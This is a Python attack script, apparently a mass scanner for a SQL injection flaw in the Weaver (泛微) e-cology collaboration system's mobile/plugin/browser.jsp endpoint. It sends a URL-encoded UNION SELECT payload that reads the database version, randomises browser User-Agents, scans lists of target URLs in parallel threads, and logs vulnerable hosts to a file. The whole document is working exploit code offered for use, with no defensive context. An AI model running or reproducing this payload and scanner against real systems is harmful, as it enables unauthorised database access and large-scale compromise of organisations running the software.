import requests
import sys
import urllib3
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import random
#app="泛微-协同商务系统"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = sys.argv[1]
url_list=[]

def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua

def wirte_targets(vurl, filename):
	with open(filename, "a+") as f:
		f.write(vurl + "\n")


proxies={'http': 'http://127.0.0.1:8080',
		'https': 'https://127.0.0.1:8080'}


def check_url(url):
	url=parse.urlparse(url)
	url='{}://{}'.format(url[0],url[1])
	vulnurl=url + "/mobile/%20/plugin/browser.jsp"
	headers = {
		'User-Agent': get_ua(),
		'Content-Type': 'application/x-www-form-urlencoded'
	}
	data = "isDis=1&browserTypeId=269&keyword=%2525%2536%2531%2525%2532%2537%2525%2532%2530%2525%2537%2535%2525%2536%2565%2525%2536%2539%2525%2536%2566%2525%2536%2565%2525%2532%2530%2525%2537%2533%2525%2536%2535%2525%2536%2563%2525%2536%2535%2525%2536%2533%2525%2537%2534%2525%2532%2530%2525%2533%2531%2525%2532%2563%2525%2532%2537%2525%2532%2537%2525%2532%2562%2525%2532%2538%2525%2535%2533%2525%2534%2535%2525%2534%2563%2525%2534%2535%2525%2534%2533%2525%2535%2534%2525%2532%2530%2525%2534%2530%2525%2534%2530%2525%2535%2536%2525%2534%2535%2525%2535%2532%2525%2535%2533%2525%2534%2539%2525%2534%2566%2525%2534%2565%2525%2532%2539%2525%2532%2562%2525%2532%2537"
	try:
		res = requests.post(vulnurl, verify=False,data=data,allow_redirects=False, headers=headers,timeout=5,proxies=proxies)
		if res.status_code == 200 and 'show' in res.text:
			print("\033[32m[+]{} is vulnerable\033[0m".format(url))
			wirte_targets(vulnurl,"vuln.txt")
		else:
			print("\033[34m[-]{} not vulnerable.\033[0m".format(url))
	except Exception as e:
		print("\033[34m[!]{} request false.\033[0m".format(url))
		pass


def multithreading(url_list, pools=5):
	works = []
	for i in url_list:
		# works.append((func_params, None))
		works.append(i)
	# print(works)
	pool = threadpool.ThreadPool(pools)
	reqs = threadpool.makeRequests(check_url, works)
	[pool.putRequest(req) for req in reqs]
	pool.wait()


if __name__ == '__main__':
	arg=ArgumentParser(description='check_vulnerabilities By m2')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:http://ip:port")
	arg.add_argument("-f",
						"--file",
						help="Target URL; Example:url.txt")
	args=arg.parse_args()
	url=args.url
	filename=args.file
	print("[+]任务开始.....")
	start=time()
	if url != None and filename == None:
		check_url(url)
	elif url == None and filename != None:
		for i in open(filename):
			i=i.replace('\n','')
			url_list.append(i)
		multithreading(url_list,10)
	end=time()
	print('任务完成,用时%ds.' %(end-start))